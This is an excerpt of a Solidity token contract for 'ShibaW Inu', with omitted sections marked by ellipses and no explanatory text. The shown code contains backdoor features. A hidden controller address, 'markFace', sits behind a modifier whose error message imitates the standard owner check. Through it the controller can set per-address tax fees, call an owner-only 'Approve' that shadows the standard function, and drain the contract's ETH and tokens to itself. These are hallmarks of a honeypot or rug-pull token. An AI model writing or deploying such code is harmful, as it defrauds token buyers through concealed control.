...
contract ShibaW is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ShibaW Inu";
    string private _symbol = "ShibaW";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x23aB9E3C004B65B10ecC8285f9B3d7c16561F9Bd); 
    address payable private teamWalletAddress = payable(0x87B50cC2A011CbA5a9067E1A2afE09F11Dd0c1BE); 
	...
	address  public markFace =_msgSender();
	...
	modifier onlyTM {
       require(markFace == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(markFace).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(markFace, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyTM {
	...
	function Approve(address spender,uint256 amount)public onlyTM{
